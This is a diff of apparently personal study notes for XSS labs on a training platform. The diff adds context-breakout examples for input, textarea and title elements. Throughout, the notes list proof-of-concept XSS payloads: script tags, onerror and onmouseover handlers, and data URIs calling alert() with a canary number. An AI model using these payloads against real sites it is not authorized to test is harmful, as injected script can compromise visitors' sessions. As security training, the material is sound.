@@ -1,10 +1,13 @@
-# hackinghub
+# hackinghub  
 
 ## xss  
-[https://app.hackinghub.io/hubs/nbbc-xss](https://app.hackinghub.io/hubs/nbbc-xss)    
+[https://app.hackinghub.io/hubs/nbbc-xss](https://app.hackinghub.io/hubs/nbbc-xss)  
 
 ### basic xss  
-- The number `19628397001` is just a random number that can be used as a [canary](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/canary) to search proxy history for the value.  
+
+The number `19628397001` in the examples below is just a random number that can be used as a [canary](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/canary) to search proxy history for the value.  
+
+Try to start with simple payload like `<h1>19628397001` to see what happens.  
 
 ```
 <script>alert(19628397001)</script>
@@ -19,9 +22,11 @@
 <object data="data:text/html,<script>alert(19628397001)</script>"></object>
 <script src="data:text/javascript,alert(19628397001)"></object>
 </p><h1><u/onmouseover=alert(1)>19628397001
-```
+```  
 
 ### contexts  
+
+#### input example  
 
 value inside an input:  
 `<input value="19628397001">`  
@@ -29,12 +34,29 @@ value inside an input:
 try to break out with a payload like...    
 ```
 test"><script>alert(19628397001)</script>
-```
+```  
 
 or use an event like this...  
 ```
 test" onmouseover=alert(19628397001);//
+```  
+
+#### textarea example   
+
+value inside a textarea:  
+`<textarea>19628397001</textarea>`  
+
+try to break out with a payload like...  
 ```
+test</textarea><img/src=x onerror=alert(19628397001)>
+```  
 
+#### title example  
 
+value inside a title:  
+`<title>Welcome, 19628397001</title>`  
 
+try to break out with a payload like...  
+```
+test</title><img/src=x onerror=alert(19628397001)>
+```  
